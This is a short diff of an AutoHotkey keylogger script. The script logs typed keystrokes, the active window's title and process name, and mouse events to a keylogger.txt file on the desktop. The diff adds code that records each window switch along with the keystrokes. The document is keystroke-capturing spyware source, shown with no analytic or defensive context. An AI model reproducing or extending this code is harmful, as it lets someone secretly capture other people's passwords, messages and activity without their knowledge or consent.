@@ -6,6 +6,7 @@
 log = %A_Desktop%\keylogger.txt
 
 mouseevent(message) {
+    global 
     MouseGetPos, x, y, window, controln
     WinGetActiveTitle, Title
     WinGet, ProcessName, ProcessName, A
@@ -13,14 +14,18 @@ mouseevent(message) {
 }
 
 getwin() {
+    global
     WinGetActiveTitle, Title
     WinGet, ProcessName, ProcessName, A
     FormatTime, time, , yyyy-MM-dd-HH:mm:ss
     FileAppend, `n%time% %ProcessName%: %Title%`n, *%log%
 }
 
+getwin()
+
 Loop {
     WinWaitNotActive, % "ahk_id " WinActive("A")
+    getwin()
 }
 
 ~a::FileAppend, a, *%log%
